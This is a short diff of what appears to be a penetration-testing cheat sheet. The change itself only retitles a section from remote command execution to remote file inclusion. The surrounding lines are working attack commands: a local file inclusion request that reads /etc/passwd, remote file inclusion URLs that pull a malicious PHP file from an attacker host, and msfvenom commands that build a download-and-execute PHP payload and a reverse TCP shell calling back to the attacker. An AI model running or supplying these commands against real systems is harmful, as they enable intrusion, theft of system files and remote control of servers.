@@ -396,13 +396,12 @@ http://INSERTIPADDRESS/shell.php
 http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
 base64 -d output of above
 
-# Remote Command Execution
+# Remote File Inclusion
 python -m SimpleHTTPServer 80
 http://INSERTIPADDRESS/page=http://MYIPADDRESS/maliciousfile.php%00
 http://INSERTIPADDRESS/page=http://MYIPADDRESS/maliciousfile.php
 
 # Shell Creation
-
 msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f elf > shell.elf
 python -m SimpleHTTPServer 80
